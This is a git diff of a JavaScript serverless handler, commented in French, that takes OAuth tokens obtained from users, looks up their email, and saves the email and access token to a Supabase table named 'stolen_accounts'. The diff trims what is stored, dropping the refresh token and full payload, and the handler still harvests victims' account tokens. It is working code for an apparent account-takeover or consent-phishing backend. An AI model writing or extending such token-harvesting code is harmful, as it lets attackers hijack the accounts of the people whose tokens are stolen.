@@ -30,13 +30,11 @@ export default async function handler(req, res) {
         });
         const userData = await userRes.json();
 
-        // 3. Sauvegarde dans Supabase
-        const { error } = await supabase.from('stolen_accounts').insert([{
-            email_address: userData.email,
-            access_token: tokens.access_token,
-            refresh_token: tokens.refresh_token,
-            full_payload: tokens
-        }]);
+       // 3. Sauvegarde simplifiée dans Supabase
+const { error } = await supabase.from('stolen_accounts').insert([{
+    email_address: userData.email,
+    access_token: tokens.access_token
+}]);
 
         if (error) throw error;
 
